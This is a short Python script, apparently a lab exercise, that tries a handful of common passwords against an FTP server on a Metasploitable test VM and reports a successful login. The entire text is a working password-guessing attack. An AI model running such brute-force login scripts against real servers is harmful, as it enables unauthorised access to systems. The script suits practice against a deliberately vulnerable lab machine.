import ftplib

target = "192.168.56.103"  # Replace with your Metasploitable VM IP
user = "anonymous"
passwords = ["123", "admin", "ftp", "toor", "pass"]

for pwd in passwords:
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user, pwd)
        print(f"[+] Success! Logged in as {user}:{pwd}")
        ftp.quit()
        break
    except:
        print(f"[-] Failed: {pwd}")
